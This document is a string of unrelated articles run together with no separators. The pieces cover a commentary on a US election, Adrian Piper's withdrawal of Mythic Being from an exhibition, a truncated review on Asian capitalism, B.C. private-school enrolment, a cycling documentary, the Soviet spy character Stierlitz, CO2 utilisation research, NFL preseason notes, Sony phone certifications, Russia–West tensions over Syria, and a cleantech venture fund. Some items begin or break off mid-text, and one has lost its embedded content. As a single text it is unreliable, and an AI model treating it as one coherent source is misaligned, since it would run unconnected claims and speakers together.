He explained that some capable politicians are not willing to embarrass themselves on the election stage at the cost of their privacy and that of their family as the butt of jokes.
“As a result, the world was presented with an election farce performed by the two unqualified and big-mouth candidates selected by the two parties,” the author concluded.
“It is obvious that the US is seeing a decline in terms of both prestige and influence, but such a drop is not so eye-catching as it has no strong competitors yet. It would be a complicated historic path,” the scholar said, calling for more attention to the course of the world pattern.
In 1973 Adrian Piper pasted a mustache on her face, put on an Afro wig, and donned round, wire-rimmed shades.
Dressed and acting like a man, she went out into the streets.
Muttering passages she had memorized from her journal, the artist was startling and weird, challenging passersby to classify her through the lens of their own preconceptions about race, gender, and class.

Who was this light-skinned black man, going on and on about how his mother bought too many cookies. Was he crazy? Was he dangerous? Why was he being followed by a film crew?
These street actions formed the basis of The Mythic Being, an influential work of performance art that helped establish Piper's reputation as provocateur and philosopher.
At a time when Conceptual and Minimal art were mostly male domains that pushed to reduce art to idea and essence, Piper pushed back with confrontational work that brought social and political issues to center stage. And at a time when most performances were barely documented, Piper announced her project in ads in the Village Voice, arranged for it to be filmed by Australian artist Peter Kennedy, and created works on paper dominated by her aggressive alter-ego.
In the catalogue for “Radical Presence: Black Performance in Contemporary Art,” currently at NYU's Grey Art Gallery, curator Naomi Beckwith describes Mythic Being as “a seminal work of self-fashioning that both posited and critiqued models of gender and racial subjectivity.”
COURTESY SMART MUSEUM OF ART, THE UNIVERSITY OF CHICAGO, PURCHASE, GIFT OF CARL RUNGIUS, BY EXCHANGE, 2001.126a.
Footage from Mythic Being, borrowed from Kennedy, had been playing on a monitor in the Grey's galleries until this week—when Piper requested the work be removed. The monitor was turned off and the gallery posted a note to viewers on top.
It explained that the artist had articulated her reasons in correspondence with Valerie Cassel Oliver, the show's curator, which reads in part:
“I appreciate your intentions. Perhaps a more effective way to ‘celebrate [me], [my] work and [my] contributions to not only the art world at large, but also a generation of black artists working in performance,' might be to curate multi-ethnic exhibitions that give American audiences the rare opportunity to measure directly the groundbreaking achievements of African American artists against those of their peers in ‘the art world at large.'”
The note responds with a statement of Cassel Oliver's from the catalogue, arguing that the show's mission is to resist “reductive conclusions about blackness: what it is or what it ain't. What is clear is that it exists and has shaped and been shaped by experiences. The artists in this exhibition have defied the ‘shadow' of marginalization and have challenged both the establishment and at times their own communities.”
COURTESY SMART MUSEUM OF ART, THE UNIVERSITY OF CHICAGO, PURCHASE, GIFT OF CARL RUNGIUS, BY EXCHANGE, 2001.126a.
In response to Piper's request, Cassel Oliver added: “It is clear however, that some experiences are hard to transcend and that stigmas about blackness remain not only in the public's consciousness, but also in the consciousness of artists themselves. It is my sincere hope that exhibitions such as Radical Presence can one day prove a conceptual game-changer.”
In depriving students and the larger public from seeing her work at the Grey, the artist, who currently lives in Berlin and runs a foundation dedicated to art, philosophy, and yoga, has chosen to make a larger point about marginalization and otherness, themes that have dominated her work throughout her career.
The question is whether separate exhibitions are still needed to tell the stories that were left out and continue to be absent from conventional tellings of art history, or whether creating these separate spaces amounts to a kind of ghettoization that prevents the artwork from being considered on the larger stage.

These issues are hardly confined to race, of course—curators of exhibitions on gender, nationality, and other aspects of identity routinely encounter artists who decline to participate because they don't want to be considered in the context of “women artists,” “Jewish artists,” and so on. So, sometimes, do our contributors and photo editor when we run stories on these issues.
The organizers of “Jew York,” a show at Zach Feuer and Untitled galleries in New York last summer, were turned down by several artists who didn't want to appear under such a rubric. Luis Camnitzer, a German-born Uruguayan artist, was so conflicted that he couldn't decide whether to recuse himself or contribute a piece. So he sent a letter describing his conundrum, which became part of the show. It read in part: “Do I refuse the invitation on the grounds of feeling that it is an artificial and anecdotal grouping irrelevant to the work of most artists invited and therefore tinged by an aroma of weird fundamentalism? Or do I have to accept on the grounds of my need not deny my Jewish connections bound by my ethical debt and beliefs? Maybe not totally pleasing to everybody, this letter tries to be my compromise.”

When “Radical Presence” opened at the Contemporary Arts Museum, Houston, last year, it also included five works from Piper's 1975 series I am the Locus, collaged and painted Polaroids on which images of Piper as the Mythic Being are inserted into scenes of a crowded street. The text gets bigger as the figure approaches the viewer, culminating in the warning “Get Out of My Way, Asshole.” The works, owned by the Smart Museum at the University of Chicago, were deemed too fragile to travel to New York.
Part II of the New York version of “Radical Presence” opens at the Studio Museum in Harlem on November 14. It doesn't include any works by Piper. The show is scheduled to travel to the Walker Art Center in Minneapolis next year.

“Let some people get rich first,” the Chinese leader Deng Xiaoping proclaimed a generation ago, inaugurating a strange new phase in his country's—and the world's—history. It now seems clear that nowhere has capitalism's promise to create wealth been affirmed more forcefully than in post–World War II Asia. By now we have all heard about the rise of China and India as economic powers. But as early as the late 1960s, the rates of economic growth in South Korea, Hong Kong, Taiwan, Singapore, and even Thailand, Indonesia, and Malaysia were double the rate in European and American countries.
In most of these nations, collaborations between the military or authoritarian-minded governments and businessmen ensured the rise of big, often monopoly, conglomerates, such as the South Korean chaebols. Most ordinary people suffered from a long denial of democracy and then, following free elections, the subversion of democratic institutions; after decades of uneven economic growth they now try to cope with the irreversible contamination of air, soil, and water. Long working hours, low wages, limited mobility, and perennial job insecurity are the lot of most toilers in Asian economies, especially women. Nevertheless, some people have gotten extremely rich in Asia's own Gilded Age: for instance, in “rising” India, the number of malnourished children, nearly 50 percent, has barely altered while a handful of Indian billionaires increased their share of national income from less than 1 percent in 1996 to 22 percent in 2008.
Such concentrations of private wealth are now common across Asia, which accordingly has produced several Horatio Alger–type legends of its own. Born in 1928, Hong Kong's Li Ka-shing, today Asia's richest man with an estimated wealth of $31 billion, started out as a poor immigrant from China hawking plastic combs. Another kind of morality tale is illuminated by the career of the Indonesian Mochtar Riady, who worked in a bicycle shop before he turned his modest enterprise, with the help of the Indonesian strongman Suharto and the “bamboo network” of overseas Chinese businessmen—the greatest Asian economic power outside of Japan—into a family business empire drawing on global resources.
Most Americans first heard of Riady when his banker son James was convicted of funneling illegal donations to Bill Clinton's presidential campaign in 1996; he was also accused of links with Chinese intelligence. But then similar stories of corporate and political intrigue are not unknown in the history of capitalism in the West. After all, families owned businesses, ran banks, and sought to manipulate political processes in Victorian England and Wilhelmine Germany. Robber barons dominated the early phases of American industrial capitalism before the oil, steel, and railway tycoons, and their family members, descendants, and cronies, gave way to relatively transparent, shareholder-friendly companies.
What is new is the growing literary assessment of the ideology and practice of Asian capitalism. In Sea of Poppies and River of Smoke,…

Enrolment at independent schools across British Columbia has spiked this year, and the 2014 five-week public-school teachers' strike is part of the reason, says a spokesman for a group representing private institutions.
Student enrolment at private-sector schools jumped 6.75 per cent this past year, according to the Federation of Independent School Associations of B.C. (FISA).
The growth is much higher than the average two-per-cent increase the sector typically sees.

The high demand means that some families who filled out applications for the coming 2015-16 school year have been put on waiting lists or haven't been accepted at all.
Beyond labour disruptions, there are many reasons parents choose independent schools, such as wanting faith-based education or specialized programs for their children, said Peter Froese, executive director of FISA B.C.
But Mr. Froese explained that the biggest gains in private-school enrolment were seen at so-called online distributed learning schools, where public-school students are able to enroll for classes. That translated into an additional 4,000 students enrolling for at least one course this year.
"That's the largest year-over-year increase in distributed learning education in this province since independent schools participated in 2002," Mr. Froese said.
He said it remains to be seen if the new enrolment levels will be maintained.
Students who enrolled for the purpose of filling the missed weeks of school during the public-school strike may not register for online courses again, Mr. Froese said.
But at traditional bricks-and-mortar private schools, enrolment has also increased and interest for the coming year is on the rise.

"We know that there is a lot of interest in independent-school education and that has been reported to us by schools that are having open houses," Mr. Froese said.
York House School, for example, received its highest number of applicants in the past decade for next September, according to Mabel Lim, the school's director of admissions.
Nearly 500 families submitted an application, an increase of between 10 and 15 per cent from the previous year's application numbers, Ms. Lim said.
In an average year, the school has only about 70 spots available between junior kindergarten and Grade 12 meaning most applicants will not be accepted.
South-Surrey parents Quentin Nakonechny and Denise Phipps experienced the ups and downs of trying to find the right independent schools with spaces available for their children.
"It was a bit nerve-racking … we knew there was a pool of talented kids who were vying for the one spot," Dr. Phipps said.

Dr. Nakonenchy and Dr. Phipps explained that although they didn't have problems with their children's public schools, they wanted schools that offered more activities and a closer-knit community.
The family got a break when a space opened up at the all-girls York House School in Vancouver this year, allowing their daughter, Mila, to enroll in Grade 3.
She is now among approximately 80,000 students in B.C. who attend an independent school.
Dr. Nakonenchy and Dr. Phipps hoped to have their son, Peter, enrolled at St. George's School in Vancouver for Grade 7, but were unsuccessful.
Although school culture, engagement and social activities were priorities for the family in seeking a private school, they said strikes in the public sector were a factor in making their decision.
"We felt like he lost the year in Grade 4," Ms. Phipps said of the 2012 strike.
Story continues below advertisement
"We didn't want him to lose another year in Grade 7 as well, which is a big step before high school."
Education Minister Peter Fassbender said in a statement that although B.C. schools are among the best, "it's no surprise to see an increase in independent-school enrolment."
"It was unfortunate that during the strike parents heard many negative messages about our public-school system," Mr. Fassbender said.
"Now that we have a long-term labour agreement, our focus is on working with the [B.C. Teachers' Federation] to further improve student outcomes and remind parents that we have a world-class public education system," he said.
Public schools have seen a decline in enrolment over the years because there are simply fewer school-age children in the province.
Yet private schools have experienced continual growth, suggesting labour disputes in the public sector is only one reason parents are seeking alternatives.

At Vancouver College, the school has run its classes from junior kindergarten to Grade 12 at capacity for many years.
A waiting list for every grade is the norm and the size of this year's application pool isn't notably different, said John Nixon, the school's president.
Vancouver College is the only all-boys Catholic school in the province.
Parents are likely motivated to apply for that reason, rather than other issues in the education sector, Mr. Nixon said.
Regardless of the motivation for applying to an independent school, ending up on a waiting list or being rejected outright can be a big disappointment. But opening up more spots at private schools to meet the demand isn't simple. The high cost of land, on top of the cost of construction, makes it difficult for independent schools in the Metro Vancouver area to expand or for new schools to break ground, Mr. Froese said.
A few groups have contacted FISA B.C. with interest in establishing new schools, he said, which could alleviate the enrolment pressures in the coming years.

For the existing private schools, however, the continued growth in applications is a welcome phenomenon.
"We're in good shape," Mr. Froese said.
Enrolment numbers
635,057 students were registered across all school sectors in 2013-2014
79,258 full-time equivalent students registered at independent schools in 2014-2014, up from 74,333 that registered in 2013-2014
In Vancouver, enrolment increased by 4.25 per cent
In Northern and Central B.C., it increased by 12 per cent
In the Okanagan and Kootenay regions, enrolment was up by 31 per cent
In the Lower Fraser Valley, enrolment increased by 8 per cent
In Vancouver Island and the Sunshine Coast, enrolment increased by 5 per cent
Watch the trailer to a film that promises to be "an enjoyable and sometimes hilarious romp through the secret world of men and masculinity"
A new documentary film has been released that celebrates what it is to be a MAMIL – middle aged men in Lycra.
MAMIL explores how cycling has brought together people from a wide range of backgrounds in a shared love of cycling. It features riders from Britain, Australia, the USA, New Zealand, France and Spain talking about what cycling brings to their life.
Several cycling clubs come under focus in the movie, including the Adelaide Fat Boys (Australia), Altoona Road Riders (Des Moines, USA) and MAMIL Sports (Nottingham, UK).
“These are middle-aged, middle-class men with careers, families and mortgages,” says the film's website.
“They are never going to win the Tour de France – yet they spend a huge amount of time, money and energy on cycling. Why is it so important to own the best bike and all the right gear? What compels them to choose long hours on the road over time with the family?
>>> New study explains why you enjoy riding your bike (if you're a Mamil)
“This light-hearted, yet insightful, feature length documentary explores the secret lives of MAMILs in their natural habitat through interviews with experts interwoven with MAMIL stories set around the world.”
“MAMIL is an enjoyable and sometimes hilarious romp through the secret world of men and masculinity; that also explores the things that men are reluctant to talk about.”
The 98-minute film was made by Nickolas Bird and Eleanor Sharpe from Adelaide, Australia. Well-known cycling commentator Phil Liggett provides the film's commentary.
MAMIL was screened again at the Adelaide Film Festival on Wednesday, October 11, and is available for screening in cinemas via Demand Film.

Max Otto von Stierlitz (Russian: Шти́рлиц, IPA: [ˈʂtʲirlʲɪts]) is the lead character in a popular Russian book series written in the 1960s by novelist Yulian Semyonov and of the television adaptation Seventeen Moments of Spring, starring Vyacheslav Tikhonov, as well as in feature films, produced in the Soviet era, and in a number of sequels and prequels. Other actors portrayed Stierlitz in several other films. Stierlitz has become a stereotypical spy in Soviet and post-Soviet culture, similar to James Bond in Western culture.
Character [ edit ]
In the universe of the Seventeen Moments of Spring, Stierlitz is the cover name for a Soviet super-spy Colonel Maxim Maximovich Isaуev (Макси́м Макси́мович Иса́ев), whose "real" name is Vsevolod Vladimirovich Vladimirov (Все́волод Влади́мирович Владимиров).[1]
Stierlitz takes a key role in SS Reich Main Security Office in Berlin during World War II, infiltrating Ausland-SD (foreign intelligence) headed by Walter Schellenberg. Working deep undercover, Stierlitz tries to collect intelligence about the Germans' war plans and communicate it to Moscow. He receives instructions from Moscow on how to proceed, on one occasion traveling to Switzerland on a secret mission.[2] He diverts the German nuclear "Vengeance Weapon" research program into a fruitless dead-end, thwarts separate peace talks between Nazi Germany, the United Kingdom and the United States, engages in intellectual games with members of the Nazi high command and sacrifices his own happiness for the good of his motherland. Despite being wracked with desire to return home to his wife he subordinates his feelings to his duty, thus embodying an idealised Soviet vision of patriotism.[3]
Stierlitz is quite an opposite of the action-oriented James Bond; most of the time he gains his knowledge without any Bond-style stunts and gadgets, while in the film adaptation of the stories the action is presented through a narrative voice-over by Yefim Kopelyan.[4] He is presented in a deeply patriotic but non-ideological light, fighting to defend the Soviet motherland against external enemies rather than just defending the Communist government against its ideological opponents.[5]
Influences in Russian life and culture [ edit ]
Although Stierlitz was a much-loved character, he was also the butt of a common genre of Russian jokes, often satirising his deductive trains of thought, with unexpected twists, delivered in the deadpan style of the voice-overs in the film adaptations; for example:
Stierlitz approaches Berlin. The city is veiled in smoke from the fires. "Forgot to switch off the iron again," thought Stierlitz with slight irritation.[6]
Stierlitz continues to be a popular character in modern Russia. Despite the fact that references and Stierlitz jokes still penetrate contemporary speech, Seventeen Moments of Spring is very popular mainly because it is quite patriotic. It is repeated annually on Russian television, usually around Victory Day.[4] Stierlitz also continues to have a political significance. When his portrayer Vyacheslav Tikhonov died in December 2009, the Foreign Intelligence Service—one of the successor organisations of the former Soviet KGB—sent its condolences to his family.[7] Ivan Zassoursky notes that Russian Prime Minister (and former and current President) Vladimir Putin, a former KGB agent, has been portrayed as "embod[ying] the image—very important for the Russian television audience—of Standartenführer von Stierlitz... If anyone missed the connection between Putin, who served in Germany, and von Stierlitz, articles in the press reminded them of the resemblance and helped create the association."[3] The connection went both ways; Putin was strongly influenced by the novels, commenting: "What amazed me most of all was how one man's effort could achieve what whole armies could not."[5]
Stierlitz movies contributed a number of catchphrases, such as "Character: nordic, robust" (Характер — нордический, выдержанный, a personal characteristic, usually mocking or ironic).[8]

To curb the amount of CO2 present in the atmosphere, researchers would like to use it to produce polymers, fuel, or even construction materials. Game on!
In 2014, a trifling 36 billion tons of CO 2 were released into the atmosphere as a result of human activity. This unprecedented concentration must be drastically reduced if the rise in the Earth's temperature is to be limited to 1.5 °C by the end of the century, as agreed by the countries present at the recent COP21 Conference in Paris. Although the primary solution is and will remain the reduction of greenhouse gases at the source, other avenues are being explored to "clean" the atmosphere of its excess CO 2 . Geological sequestration is one of them, but the option that has captured researchers' attention is far more unconventional, as it involves nothing less than considering atmospheric CO 2 as a new resource—in short, to use it as a raw material.
CO2 is already used as a component in Aspirin or eyeglasses lenses. Its annual consumption is of 150 million tons. "In practice, industry already uses CO 2 to produce urea, a common fertilizer that can also serve as a precursor for a number of plastics; salicylic acid, an active ingredient in aspirin and certain acne medications; or polycarbonates, the polymers found in CDs, DVDs, or eyeglass lenses," points out Marc Robert, a researcher at the LEM. "This represents a consumption of 150 million tons of CO 2 each year. Now these uses must be taken further, and new ones need to be invented."
This would be done using "atmospheric" CO 2 . One method would consist in developing systems for CO 2 capture in the ambient air, which is what Klaus Lakner, a researcher at the University of Arizona (US) is seeking to achieve with his CO 2 "tree," a device for individual use that will not be deployed on a large scale for another two or three decades. Another more realistic technique would be to capture CO 2 as it exits a factory's smokestacks, where it is the most concentrated. "Very effective capture processes for factory emissions already exist," points out François Guyot, a researcher at the IMPMC. "The principle involves dissolving the CO 2 , with its acidic pH, in base baths located on the smokestacks."
Producing fuels with CO 2
Once captured, the possibilities for transformation are plentiful, as the carbon atoms present in CO 2 can in fact be found in numerous carbon molecules highly sought after by industrial actors. "We are able to use CO 2 to produce carbon monoxide (CO), a base product with which the chemical industry develops more complex molecules," explains Robert. Enriched in hydrogen, CO makes it possible to obtain, for example, formic acid (H-COOH), a liquid compound at room temperature and pressure that could power the fuel cells of tomorrow's cars, and with less risk than the highly flammable pure hydrogen (H 2 ). More complex to synthesize than formic acid, because it is a more reduced compound, methanol (CH 3 OH) represents another prospect for CO 2 ; this alcohol, which is used as a solvent in paint, varnish, and ink, can also serve as a fuel, notably for rockets.
It will still take ten to twenty years before these processes can be industrialized. However attractive, using CO 2 to synthesize other carbon products on a large scale implies to overcome a number of obstacles. "The CO 2 molecule is very inert," explains Robert. “Its carbon-oxygen bonds are extremely solid and require an enormous amount of energy to break, hence the considerable expense at the industrial level." Most importantly, these catalysis operations—for it is indeed catalysis—are based on the use of precious metals such as platinum, gold, silver, rhodium, iridium or ruthenium, which hinders their spread. Hundreds of laboratories across the globe are therefore striving to improve these catalytic processes, by making them less energy hungry and by testing non-precious metals.
Robert and his team are striving to develop a catalytic process using iron, the most abundant metal in the Earth's crust. "At this point in time, we are able to produce CO from CO 2 , in a controlled manner, by using electrodes containing iron," he enthuses. "And we are able to do so by limiting the by-products resulting from the catalysis to a minimum, since we only obtain carbon monoxide in gaseous state, and liquid water." The beauty of the experiment is that all of the electricity required for the catalysis is provided by solar panels, which is a 100% renewable energy source. Other laboratories, notably Australian, have succeeded in producing a mixture of CO and formic acid with nickel electrodes. Processes using copper crystals directly produce methanol, but in small quantities and mixed with numerous other by-products. "It will take another ten or twenty years for these processes to be applicable to industry," Robert says.
The Holy Grail for researchers would be to produce hydrocarbons comparable in every way to those used today in cars or trucks, such as octane (C 8 H 18 ). "Of course, their combustion would once again release CO 2 into the atmosphere, but it would be recaptured and transformed again into fuel, and so on," explains Robert. Simply put, this would amount to creating a new—and virtuous—carbon cycle.
Nature as a source of inspiration
The needs of the chemical industry are a source of inspiration for scientists, although not the only one. Why not copy natural processes altogether by producing rocks from CO 2 ? "Nature did not wait for us to use atmospheric CO 2 ," explains Guyot. "It does so in two distinct ways: to generate biomass through photosynthesis, with plants using atmospheric CO 2 and water to produce sugars and oxygen, and to create rocks, in the form of carbonates. An example of this process, called carbonation, built up over periods of thousands of years, can be found at sea: the chalk cliffs of Étretat (France) or Dover (UK)are entirely composed of calcium carbonates (CaCO 3 )! "The advantage of transforming CO 2 into rocks is that it is extremely stable in solid form," explains the geologist. "There is no risk of finding it in the atmosphere."
The advantage of transforming CO2 into rock is that it is extremely stable in its solid form. Creating rocks in the laboratory is the somewhat crazy challenge taken up by a French research consortium, as part of the Carmex project. "In nature, rocks are leached (washed) by rainwater, releasing calcium (Ca) along with iron (Fe) or magnesium (Mg), minerals that end up in oceans and subterranean water," explains Florent Bourgeois, of the LGC in Toulouse. "There they precipitate with the CO 2 dissolved in water (in the form of CO 3 ions) to produce calcium carbonate or calcite carbonate (CaCO 3 ), iron carbonate or siderite (FeCO 3 ), or magnesite (MgCO 3 ), in the form of tiny solid residue."
The idea is to reproduce, and especially speed up, these natural geological processes by heating the mixture. "With our technique, we are able to produce 'pebbles' of approximately ten microns," specifies Bourgeois. "But to do so, the solution must be heated to 180°C and be under a few bars of pressure. This requires too much energy, which we are trying to reduce." CO 2 storage in solid form is not the sole objective. "Carbonates are materials used in the production of cement, for example. The ones we artificially produce could also serve as construction materials," suggests Bourgeois, who is keen to involve construction professionals in his project.

1. I think if you're the Bengals, you consider this a win despite losing the game. Once viewed as an incomplete product, this offense is finally starting to make sense to me. Dalton could not miss A.J. Green early, which is a welcome sign for the Pro Bowl wideout who missed six games a year ago. In 2016, Green was being targeted 10 times per game by Dalton, and stunningly that number could actually rise if rookie wideout John Ross can extract some pressure. Dalton and Ross do not seem to have their timing down just yet on the deep route -- one pass sailed about 10 yards past the speedy Ross -- though Ross missed significant time early in camp. By the time Dalton and Ross have their mechanics down, this could be a scary starting 11.
1a. Ross, by the way, was utilized in a jet-sweep type play with the starting offense. This confirms the obvious in his debut: The Bengals will get him the ball any way possible.
2. Joe Mixon seems to be the glue holding this all together. The Bengals have the deepest running back depth chart in football, and won't be afraid to feature Mixon like a primary every-down back. His juke move on Josh Norman -- a cherry atop an otherwise impressive 6-yard run -- was professional-grade. His lone error, a fumble caused by Mixon closing his arms just a second too early, was forgivable.
3. There are no words:
4. Terrelle Pryor eventually redeemed himself with a tough catch -- his second of the preseason -- but I'm not convinced his addition is enough to offset the losses of Pierre Garcon and DeSean Jackson. Pryor's route-running ability has come a long way, but Kirk Cousins is going to need him to be more than a nice conversion project; he's going to need Pryor to carry certain possessions. In fairness, Washington was asking Pryor to go over the middle quite a bit on Sunday, and it's difficult to gauge those routes when the games don't impact the final standings.
5. Speaking to reporters after the game, tight end Jordan Reed (toe) said he felt good in his debut. From afar, he looked comfortable pushing off the sprained toe and flashed some of his trademark speed. He caught two passes for 12 yards.
6. A random note on Cousins: After getting plowed by Dre Kirkpatrick on a cornerback blitz, Cousins opted to keep the ball on the next play (what looked to me like a zone-read handoff) and run for the first down. When he tossed the pick-six to Vontaze Burfict (a beautiful bait and read by the Bengals linebacker) Cousins was the closest one to making a tackle. He chased Burfict all the way to the end zone.
1. I think your final takeaway from Sunday's 49ers/Vikings game depends on how you feel about San Francisco's defense. If you believe in the combination of Solomon Thomas, Arik Armstead and DeForest Buckner and that defensive coordinator Robert Saleh is delivering on his promise to create a violent defense, then it wasn't too depressing to watch the Vikings' offensive line get run over. If the Buckner/Thomas/Armstead era is still a year or two from taking off, and were made to look as good as they were last night because of the Vikings offensive line, then this was a red-alert game. Sam Bradford (17-of-21, 134 yards) was on the run, at one point getting knocked down when his own offensive lineman was thrown into his chest. Dalvin Cook has shown an ability to pick up stray blitzers, but this is not going to be enough to keep Bradford off the ground.
1.a. As the St. Paul Pioneer Press noted Sunday night: 11 possessions for the Vikings first-team offense, 3 total points.
2. Reuben Foster lived up to the hype on Sunday night. The rookie linebacker delivered two memorable pops, first on Cook after Bradford floated a late outlet pass, and again later on in the half on Laquon Treadwell. Foster has that classic thumper lineage but has certainly proven himself open and agile when facing quicker targets in the open field.
3. The 49ers remind me a bit of the Browns this preseason defensively. There is a lot to like -- a person projecting potential over time would take their chances with a roster like this. However, it's difficult to buy into an identity just yet. Seeing Foster blow people up Sunday, or even safety Eric Reid coming down and delivering some Kam Chancellor-esque hits was enticing -- but what does it really mean come Sept. 10 against the Panthers?
4. Another what does it really mean statement: Brian Hoyer looked incredible on Sunday. Hoyer started the game 9-of-9 for 152 yards and a pair of touchdowns. A few quick slants to Pierre Garcon set up this beautiful 46-yard bomb to Marquise Goodwin. Former NFL player Matt Bowen breaks the route concept down well here. If Shanahan was able to assemble just a microcosm of Atlanta's offense in San Francisco this year, how good could the 49ers be?
5. The rumors of a more in-shape Carlos Hyde seem to be true. The 49ers' workhorse sliced through Minnesota's defense on a 7-route for Hoyer's second touchdown of the night. Players return to camp every summer claiming their change in diet or workout regimen have them prepared to play the best football of their lives. Hyde's burst and breakaway speed seem to have proven that true in Hyde's case.
Sony's upcoming Xperia Z4 smartphone may have just received the necessary certification from Postel, the Indonesian authority that deals with such things.
Three Sony phone models have been given the all clear by Postel, one of which could in fact be the Xperia Z4. The Indonesian authority has only given us the devices' model numbers, but we can make some assumptions based on them.
So let's start with the E6533. Last year's Xperia Z2 had the model number D65xx, while the Xperia Z3 was D66xx. The letter used has to do with the year of release - so "E" is right on track for 2015, "D" was for last year, and "C" for 2013. If Sony keeps its naming scheme for the model numbers intact, and there's no reason why it shouldn't, then the E6533 could very well be the Xperia Z4.
Joining it in the Japanese company's portfolio at some point during this year will be the E5333, as well as the E2353. The latter will obviously be the lowest-end of them all, and could actually serve as the successor to the Xperia M2 (which is the D23xx).
The E5333 looks like a midranger by its model number, though exactly which handset it's supposed to replace in Sony's roster isn't clear. The closest older device to its model number is the Xperia T2 Ultra phablet, but that doesn't necessarily mean that this one will have a big screen too.
As for the Z4, if it has started its certification tour already then it should become official sooner, rather than later.

Vladimir Putin is gearing up for a 'hot war' he doesn't want - but will not back down if he provoked over Syria, Britain's former ambassador to Moscow has warned.
Sir Anthony Brenton insists relations between the Kremlin and the West are 'the most dangerous' he has ever seen amid heightened tensions over the country's bombing campaign in Syria.
While Russia 'means business' having sent warships past British shores and displayed its military might, Moscow is 'weak' and does not want a war, Sir Anthony said.
Vladimir Putin (pictured) is gearing up for a 'hot war' he doesn't really want - will not back down in a face-off with the West because the humiliation will topple him, Britain's former ambassador to Moscow has warned
In an exclusive opinion piece for the Daily Mirror, he said it is 'close to impossible' for Russia to back down because the ' loss of face would almost certainly be the end of Putin'.
There has been weeks of posturing between Russia and the West with both sides trading accusations over the brutal civil war in Syria.
Today Russia sent the naval destroyer Smetlivy to Syria to join its fleet their for the coming months.
The heavily armed ship left the Crimean port of Sevastopol to great fanfare en route to Syria via Greece to take part in a festival.
And Sir Anthony added: 'If we act on Syria in any way that could escalate to a Russian attack, they are signalling as clearly as they can that they would retaliate.'
Britain's Foreign Secretary Boris Johnson condemned airstrikes on a Syrian school (pictured) that left at least 22 children and six teachers dead
While Russia 'means business' having sent warships past British shores and displayed its military might, Moscow is 'weak' and does not want a war, Sir Anthony Brenton said. Russian troops are pictured in the Novosibirsk region of Russia earlier this month
However, he said that while the situation was dangerous, Russia is also 'weak', spending far less on its military than the West.
He added: 'They do not want war. They would lose. These shows of strength are not an intention to fight, but a signal that fighting must be avoided.'
Sir Anthony, who was British ambassador to Moscow between 2004 and 2008, suggested Russia and the West needed to respect each other's 'vital interests' and said the two parties had managed to pull back from disaster during the Cold War.
Britain this week announced plans to send 800 troops to Estonia at its border with Russia.

More than 200,000 specialists of rescue units and 50,000 units of equipment were said to have been involved in a mass nuclear war readiness drill in Russia
The Royal Navy was placed on red alert after it emerged Russia was sailing a fleet of warships along the British coast en route to Syria
But Sir Anthony said Russia would not attack a Nato country deliberately because 'they would lose'.
While the situation is 'dicey', 'peace still lies in our hands', he said.
Meanwhile, Britain's Foreign Secretary Boris Johnson condemned airstrikes on a Syrian school that left at least 22 children and six teachers dead.
He wrote on Twitter: '[The] world will be sickened by Syrian school bombing. 20+ children dead. Russia and Syria regime must end butchery and agree to peaceful solution.'
International development secretary Priti Patel said: ‘Schools should be safe places to learn, not transformed into places of slaughter.
‘These airstrikes are a barbaric assault on the world's humanity. It is time the Syrian regime, and their Russian backers end this conflict.'
Russia denied involvement in the deadly bombing.
His comments come as Putin accused the West of building up a 'mythical and made-up' threat of Russian aggression to justify increasing military spending and bolstering NATO forces in countries neighbouring Russia.
Putin dismissed claims he is planning to invade another country calling warnings of a new Cold War 'stupid' and 'unrealistic'
RAF personnel are among a 600-strong training group at Lechfield Air Base in Bavaria working with others from France, Spain, Belgium, Germany, the Netherlands and Italy
'It's very pleasant and profitable to make yourself out to be defendants of civilisation from some new barbarians, but the thing is Russia doesn't plan to attack anyone,' he said.
'It's unthinkable - simply stupid and unrealistic,' he added. 'It's just funny to talk about it.'
His remarks come after a spell of increased aggression, which has included unveiling a new super-nuke capable of obliterating an area the size of Russia.
Putin also sailed warships through the English Channel ahead of a fresh offensive in Syria and last night it emerged Russia had launched a new super stealth submarine.
The Veliky Novgorod is the latest addition to the Black Sea fleet and is capable of striking land, sea and underwater targets.
Video has also emerged of elite Russian soldiers who can parachute out of a plane before using special equipment to plunge 30m below water with underwater submachine guns.
Earlier this week, footage showed Russia carrying out a nuclear war readiness exercise involving 40 million of its citizens while 130 military centres have been put on high alert for drills on the region's ability to respond to attacks from the West.
Meanwhile, RAF personnel are among a 600-strong training group at Lechfield Air Base in Bavaria working with others from France, Spain, Belgium, Germany, the Netherlands and Italy.
Russia has unveiled chilling pictures of its largest ever nuclear missile, capable of destroying an area the size of France. A contract for the weapons was signed in 2011, and they are expected to be ready in 2018
Each missile contains 16 nuclear warheads, according to pictures revealed online from the Makeyev Rocket Design Bureau. It is also able to evade radar.
The European Air Group members are working with Norway to test their readiness to deploy as a multi-national task force.
It comes as Russia's military escalation on Europe's border triggered the West's biggest show of force in the region since the Cold War.
However, in Germany members of 34 Squadron RAF Regiments carried out Air Traffic Operations and Force Protection exercises alongside forces from other nations.
The US is also hoping for European nations to fill four battle groups of some 4,000 troops as part of Nato's response to Russia. More troops will be sent to the Baltic states and eastern Poland early next year. They will be backed by Nato's 40,000-strong rapid reaction force.

Bill Gates, Jeff Bezos, Vinod Khosla, Jack Ma, John Doerr and 15 other high-profile investors have formed a new venture firm, Breakthrough Energy Ventures, that will pour at least $1 billion into cleantech companies over the next 20 years.
The firm's goal, according to its own website, will be: “to provide everyone in the world with access to reliable, affordable power, food, goods, transportation, and services without contributing to greenhouse gas emissions.”
BEV will invest in tech ventures at any stage, from seed through commercialization. The deals will focus on electricity, manufacturing, agriculture, buildings and transportation.
Cleantech was once the rage in Silicon Valley, with total venture capital dollars invested in clean tech hitting $6.1 billion in 2008 before the recession. But cleantech became a dirty word following the cratering of startups that had taken venture capital, as well as significant amounts of government loans, grants, subsidies or tax credits.
Along with scores of others that shut down, failing to save the planet or to realize meaningful returns for investors, were: solar panel makers Solyndra; Aptera, which attempted to make highly fuel-efficient cars; and waste-to-fuel company Kior. (Remember them?)
But a burgeoning world population, and energy needs growing along with it, are driving up demand for technology that can help people produce more of what they need with fewer resources. So cleantech is drawing investments and being discussed again, favorably, even if some VC's avoid labeling their portfolio companies as such.
BEV is the formal, venture investing initiative of the Breakthrough Energy Coalition, a group announced at the 2015 Paris Climate Change Conference.
The group, comprised of tech and finance all-stars, pledged to invest in early-stage startups in nations that were ramping up their public, R&D funding for cleantech, to reach a collective $30 billion by 2020.
Besides making its venture fund known, BEV published a framework today called the “Landscape of Innovation,” which it intends to be “a guide to other public and private investors committed to reducing global greenhouse gas emissions.”
